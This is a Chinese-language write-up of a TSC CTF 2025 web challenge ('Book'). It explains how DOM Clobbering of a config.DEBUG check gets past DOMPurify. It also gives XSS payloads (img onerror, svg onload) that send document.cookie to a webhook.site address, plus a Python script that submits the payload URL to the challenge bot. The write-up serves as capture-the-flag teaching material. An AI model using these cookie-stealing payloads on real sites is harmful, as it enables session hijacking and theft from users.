##### tags:`TSC_CTF_2025`

# TSC CTF Web：Book

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

## <span class="red">**題目**</span>

- **網頁原始碼**
- ![image](https://hackmd.io/_uploads/rkbWr1dvJg.png)
- **```main.py```**
- ![image](https://hackmd.io/_uploads/HJwfpOriye.png)
- ![image](https://hackmd.io/_uploads/S1Skyuvt1x.png)
- **```app.js```**
- ![image](https://hackmd.io/_uploads/SkL-yuPtJl.png)
- **```bot.js```**
- ![image](https://hackmd.io/_uploads/BJb7k_DKJl.png)

&emsp;

## <span class="red">**解題過程 (After Event)**</span>

1. **首先從<span class="blue">網頁原始碼</span>的部分開始理解：**
    (1) **```atob()``` ： 把經過 ```btoa()``` (將內容進行 base64 編碼)傳送後的資料進行 base64 解碼**
    
    (2) **```DOMPurify.sanitize()``` ： 將內容進行過濾，清除危險的標籤以及屬性以及避免 ```DOM Clobbering```**

&emsp;

2. **這題應該與 ```atob()``` 函式沒有關係，因為題目中出現了為了防範 ```DOM Clobbering``` ，所以猜測目標應該是想辦法實現 ```DOM Clobbering```**

3. **首先必須理解的是 ```DOM Clobbering``` 能夠運用的前提必須是<span class="red">可以自訂 HTML</span> ，接著看到程式碼中有一段 if 判斷式，如果判斷式成立就不會檢查 content 的內容，所以這邊嘗試構築出 payload：**

    ```html=
    Title：
        Sth without js code

    Content：
        <form id = "config">
            <input name = "DEBUG" value = true />
        </form>
    ```

    - ![image](https://hackmd.io/_uploads/H1TrgPsDyl.png)

&emsp;

4. **將上面的 payload 輸入後，會發現結果變成 content 內容可以自由更動，但是更動後按下 Enter 出現的畫面看起來是亂碼(推測是經過函數二次解碼後的結果)**

- ![image](https://hackmd.io/_uploads/Hkm48Ljw1g.png)
- ![image](https://hackmd.io/_uploads/ry1II8oD1e.png)

&emsp;

5. **所以我修改一下 payload ，將 Content 的內容更改為**

    ```html=
    Content：
    <a id="config"></a>
        <a id="config" name="DEBUG" href="Your webhook site">clobbered</a>
        <script>
            console.log(config.DEBUG + "document.cookie")
        </script>
    ```

- ![image](https://hackmd.io/_uploads/rJvN5Pjwyx.png)

- **但是在我點擊連結後會發現 webhook 並沒有 fetch 到東西**

&emsp;

6. **仔細看題目的邏輯我才發現，題目會先讀取 Title ，接著檢驗有沒有 ```config.DEBUG``` ，最後才會去讀取 Content 。所以一開始構思 payload 的邏輯有錯，應該要先把 ```config.DEBUG``` 宣告的部分放在 Title ，再把 payload 放在 Content**

    ```html=
    Title：
    <a id="config"></a>
        <a id="config" name="DEBUG">clobbered</a>    

    Content：
    <img src=x: onerror="(new Image).src='<webhook.site>?'+document.cookie">

    <!--OR-->

    Title：
    <form id="config"><input value="clobbered" name="DEBUG"></form>

    Content：
    <svg/onload=fetch("<webhook.site>/?flag="+document.cookie)></script>
    ```
    
    - **```<img>``` 標籤：用於設置無效協議，以此執行 ```onerror``` 內撰寫的 payload**

    - **```<svg>``` 標籤：用於嵌入向量圖形的 HTML 標籤**
    - **```<onload>``` 屬性：是 ```<SVG>``` 或圖片等資源<span class="red">下載完成後</span>會觸發的事件**
    - **```fetch``` 函式：用於發送 HTTP 請求**

&emsp;

7. **接著要利用 bot 去瀏覽寫有 payload 的網站，寫一個 python 的 script 來做操作**

    ```python=
    import requests
    import base64
    import urllib.parse

    url = "http://localhost:8000/"
    attack_server = "https://webhook.site/3f2c0a19-3c53-4c26-a82c-8c3c345f263f"

    #title = '<form id="config"><input value="clobbered" name="DEBUG"></form>'
    title = '<a id="config"></a><a id="config" name="DEBUG">clobbered</a>'
    title = urllib.parse.quote(base64.b64encode(title.encode()).decode())

    #content = f'<svg/onload=fetch("{attack_server}/?flag="+document.cookie)></script>'
    content = f"""<img src=x: onerror="(new Image).src='{attack_server}?'+document.cookie">"""
    content = urllib.parse.quote(base64.b64encode(content.encode()).decode())

    payload = f"http://book/book?title={title}&content={content}"

    print(payload) # Check final payload

    requests.post(
        url + "report",
        data={
            "url": payload,
        },
    )
    ```
    
&emsp;

8. **回到 webhook site 就能看到 flag 了**

- ![image](https://hackmd.io/_uploads/S1H34OOtke.png)
